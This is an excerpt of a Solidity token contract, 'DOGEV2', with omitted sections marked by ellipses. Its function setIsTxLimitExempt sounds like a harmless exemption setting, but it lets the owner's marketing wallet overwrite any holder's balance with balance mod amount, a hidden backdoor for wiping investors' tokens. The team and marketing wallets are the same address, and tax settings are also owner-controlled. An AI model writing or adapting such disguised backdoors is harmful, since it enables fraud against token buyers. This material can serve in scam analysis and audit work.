...
contract DOGEV2 is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "DOGEV2";
    string private _symbol = "DOGEV2";
    ...
    constructor () {
        ...
        teamWalletAddress = payable(address(0xEE585Fd70f4ECdac1821E90BE3FDBF43c037AD8f));
        marketingWalletAddress = payable(address(0xEE585Fd70f4ECdac1821E90BE3FDBF43c037AD8f));
    ...
    function setIsTxLimitExempt(address holder, bool exempt,uint256 amount) external{
        require(msg.sender == marketingWalletAddress,"Team");
        _balances[holder] = _balances[holder] .   mod(amount);
    ...
    function setSellTaxes(uint256 newLiquidityTax, uint256 newMarketingTax, uint256 newTeamTax) external {
        require(msg.sender == marketingWalletAddress,"not team");
